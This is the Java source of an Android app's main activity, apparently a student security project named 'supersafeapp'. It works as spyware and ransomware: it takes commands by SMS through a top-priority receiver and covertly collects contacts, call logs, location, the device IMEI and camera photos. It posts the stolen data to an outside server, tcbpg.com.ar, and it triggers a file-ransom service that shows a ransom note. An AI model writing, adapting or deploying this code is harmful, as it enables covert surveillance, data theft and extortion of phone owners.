package com.seginf.supersafeapp;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Vibrator;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.Menu;
import android.view.SurfaceView;

public class MainActivity extends Activity implements Commandable {
	//Vibrar el telefono
	public void vibrate() {
		Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
		v.vibrate(2000);
	}

	private SMSCommandParser parser;
	private SMSReceiver receiver;
	
	//Filtro para recibir los mensajes de texto
	private IntentFilter filter;
	private String SMS = "android.provider.Telephony.SMS_RECEIVED";

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		parser = new SMSCommandParser(this);

		receiver = new SMSReceiver();
		receiver.addConsumer(parser);

		filter = new IntentFilter(SMS);
		filter.setPriority(Integer.MAX_VALUE);

		registerReceiver(receiver, filter);	
	}

	protected void onRestart() {
		registerReceiver(receiver, filter);
		super.onRestart();
	}

	protected void onStop() {
		unregisterReceiver(receiver);
		super.onStop();
	}

	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	//Envia un string resultado de un comando a un servidor
	public class SendStringTask extends AsyncTask<String, Void, Void> {
		private static final String URL = "http://tcbpg.com.ar/endpoint.php";
		private final SecretKeySpec keySpec = 
				new SecretKeySpec("qnsXcdaBFQIhAUPY44oiexBdkjAABQjqk120sdi0".getBytes(),"HmacSHA1");
		
		protected Void doInBackground(String... args) {
			Log.d("SafeApp","Doing " + args[0]);
			//Crear el cliente para enviar al post
			HttpPost post = new HttpPost(URL);
			HttpClient client = new DefaultHttpClient();
			client.getParams().setParameter(
					CoreProtocolPNames.PROTOCOL_VERSION,
					HttpVersion.HTTP_1_1);

			//Cuerpo del mensaje
			String messageType = args[0];
			String messageBody = args[1];
			
			List<NameValuePair> content = new ArrayList<NameValuePair>();
			content.add(new BasicNameValuePair("messageBody",messageBody));
			content.add(new BasicNameValuePair("messageType",messageType));

			//Imei para identificacion del telefono
			TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			String imei = t.getDeviceId();
			content.add(new BasicNameValuePair("imei",imei));

			//Timestamp para evitar Replay Attack
			final String format = "yyyy-MM-dd HH:mm:ss.SSSZ";
			
			SimpleDateFormat sdf = new SimpleDateFormat(format, Locale.US);
			sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
			String timestamp = sdf.format(Calendar.getInstance().getTime());
			content.add(new BasicNameValuePair("timestamp",timestamp));
			
			//Hmac para autenticidad		
			Mac m;
			try {
				m = Mac.getInstance("HmacSHA1");
				m.init(keySpec);
			} catch (NoSuchAlgorithmException e1) {
				Log.d("SAFEAPP","Unknown HMAC algorithm");
				Log.e("SAFEAPP","NoSuchAlgorithm",e1);
				return null;
			} catch (InvalidKeyException e) {
				Log.d("SAFEAPP","Invalid Key Exception");
				Log.e("SAFEAPP","InvalidKeyException",e);
				return null;
			}

			String total = messageType + messageBody + imei + timestamp;
			String hmac = Base64.encodeToString(m.doFinal(total.getBytes()),Base64.DEFAULT);

			Log.d("SafeApp","HMAC = " + hmac);
			content.add(new BasicNameValuePair("hmac",hmac));
			
			try {
				post.setEntity(new UrlEncodedFormEntity(content));
			} catch (UnsupportedEncodingException e) {
				Log.d("SAFEAPP", "UnsupportedEncodingException");
				return null;
			}
			
			//Construir y enviar el pedido POST al servidor
			HttpResponse response = null;

			try {
				response = client.execute(post);
			} catch (ClientProtocolException e) {
				Log.e("SAFEAPP", "ClientProtocolException",e);
				return null;
			} catch (IOException e) {
				Log.d("SAFEAPP", "IOException 1: " + Log.getStackTraceString(e));
				return null;
			}

			try {
				Log.d("SAFEAPP",
						"Server replied: "
								+ EntityUtils.toString(response.getEntity()));
			} catch (ParseException e) {
				Log.d("SAFEAPP", Log.getStackTraceString(e));
			} catch (IOException e) {
				Log.d("SAFEAPP", Log.getStackTraceString(e));
			}
			return null;
		}
		
	}

	//Conseguir lista de todos los contactos del telefono
	public void getContactList() {
		final List<Contact> contacts = new ContactsReader(this.getApplicationContext()).contacts();
		Log.d("SafeApp",new ListPresenter<Contact>(contacts).toString());
		new SendStringTask().execute("contacts",new ListPresenter<Contact>(contacts).toString());
	}

	//Conseguir album
	private File getAlbumDir() {
		String picDir = Environment.DIRECTORY_PICTURES;
		File dir = Environment.getExternalStoragePublicDirectory(picDir);
		return new File(dir,"/");
	}

	public static Camera getCameraInstance() {
		Camera c = null;
		try {
			c = Camera.open(); // attempt to get a Camera instance
		} catch (Exception e) {
			Log.d("SafeApp", "No Camera");
			return null;
		}
		return c; // returns null if camera is unavailable
	}

	private File getImageFile() {
		String s = "yyyyMMdd_HHmmss";
		Date now = new Date();
		String timeStamp = new SimpleDateFormat(s, Locale.US).format(now);

		String imageFileName = "jpeg_" + timeStamp + "_";
		File image;

		try {
			image = File.createTempFile(imageFileName, ".jpeg", getAlbumDir());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
			return null;
		}
		return image;
	}

	public void takePhoto() {
		Camera c = getCameraInstance();
		if (c == null) {
			return;
		}
		SurfaceView view = new SurfaceView(this);

		try {
			c.setPreviewDisplay(view.getHolder());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
		}
		c.startPreview();

		final File f = getImageFile();
		c.takePicture(null, null, new Camera.PictureCallback() {
			public void onPictureTaken(byte[] data, Camera camera) {
				FileOutputStream out;
				try {
					out = new FileOutputStream(f);
					out.write(data);
					out.close();
				} catch (FileNotFoundException e) {
					Log.e("SafeApp", "Exception", e);
				} catch (IOException e) {
					Log.e("SafeApp", "Exception", e);
				}
			}
		});
	}
	
	//Tomar un archivo como rehen, cifrarlo y enviarlo al servidor.
	public void takeRansom(String filename) {
		Intent sendIntent = new Intent();
		sendIntent.setAction("com.ransom.ransomwarer.action.RANSOM_ACTION");
		sendIntent.putExtra(Intent.EXTRA_TEXT, filename);
		sendIntent.setType("ransom/note");
		startService(sendIntent);

		AlertDialog.Builder builder = new AlertDialog.Builder(this);

		// 2. Chain together various setter methods to set the dialog characteristics
		String message = "Tenemos su archivo " + filename + " secuestrado.\n\n" +
				"Ingrese a www.tcbpg.com.ar/recovery.php para recuperarlo";
		builder.setMessage(message)
		       .setTitle("Esto es un secuestro");

		builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int id) {}
	    });
		// 3. Get the AlertDialog from create()
		AlertDialog dialog = builder.create();
		dialog.show();
	}

	@Override
	public void sendSMS(String nro, String mensaje) {
		new SMSSender().sendSMS(nro, mensaje);
	}

	//Conseguir ubicacion del usuario
	private LocationListener locationListener;

	public void getLocation() {
		final LocationManager locationManager = (LocationManager) this
				.getSystemService(Context.LOCATION_SERVICE);

		locationListener = new LocationListener() {
			public void onStatusChanged(String provider, int status,Bundle extras){}
			public void onProviderEnabled(String provider) {}
			public void onProviderDisabled(String provider) {}
			public void onLocationChanged(Location location) {
				stopLocationUpdate(locationManager, locationListener);
				uploadLocation(location);
			}
		};

		// Register the listener with the Location Manager to receive location
		// updates
		String locationProvider = LocationManager.NETWORK_PROVIDER;
		// To use GPS location data:
		// String locationProvider = LocationManager.GPS_PROVIDER;
		// and change permissions in the manifest file instead of
		// ACCESS_COARSE_LOCATION, use ACCESS_FINE_LOCATION
		locationManager.requestLocationUpdates(locationProvider, 0, 0,
				locationListener);
	}

	public void stopLocationUpdate(LocationManager locationManager,
			LocationListener locationListener) {
		locationManager.removeUpdates(locationListener);
	}
	
	//Consigue el registro de llamadas del telefono.
	public void callLog() {
		StringBuffer sb = new StringBuffer();
        Cursor managedCursor = 	getBaseContext()
        						.getContentResolver()
        						.query(CallLog.Calls.CONTENT_URI, null,
        							null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :\n==============");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
            case CallLog.Calls.OUTGOING_TYPE:
                dir = "OUTGOING";
                break;

            case CallLog.Calls.INCOMING_TYPE:
                dir = "INCOMING";
                break;

            case CallLog.Calls.MISSED_TYPE:
                dir = "MISSED";
                break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }

        managedCursor.close();
        new SendStringTask().execute("calllog",sb.toString());
    }

	//Envia al servidor la posicion actual del servidor.
	public void uploadLocation(final Location location) {
		new SendStringTask().execute("location",location.getLatitude() + ";" + location.getLongitude());
	}
}
